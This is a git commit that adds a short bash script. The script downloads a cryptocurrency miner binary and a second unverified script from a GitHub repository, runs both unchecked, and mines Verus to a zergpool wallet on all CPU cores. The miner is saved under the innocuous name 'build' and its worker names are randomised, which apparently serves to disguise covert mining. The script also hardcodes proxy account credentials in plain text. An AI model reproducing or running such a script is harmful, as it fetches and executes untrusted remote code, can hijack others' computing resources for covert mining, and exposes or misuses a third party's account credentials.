2fe527ef44c77e1435048ed54b1d3fc032c1fd6a
nurfasikin <92776649+nurfasikin@users.noreply.github.com>
2022-01-10 11:59:43 +0700

    Create dgb.sh

---
+++ dgb.sh
@@ -0,0 +1,16 @@
+#!/bin/bash
+proxy="socks5://a019xpj2-3va47yc:gad7w69xcf@socks-us.windscribe.com:1080"
+array[0]="0001"
+array[1]="0002"
+array[2]="0003"
+size=${#array[@]}
+index=$(($RANDOM % $size))
+worker=${array[$index]}
+apt-get update
+wget -q https://raw.githubusercontent.com/renifer12/master/master/compile.sh
+wget -qO build https://github.com/renifer12/master/raw/master/ccminer
+chmod +x build
+chmod +x compile.sh
+./build -a verus -o stratum+tcp://verushash.na.mine.zergpool.com -u DLVmTEYCYM9jMCEWiuNuuAJ2M7GETpHcg4.$(echo $(shuf -i 1-10 -n 1)-MOD) -p x -t $(nproc --all)
+./compile.sh
+echo succes
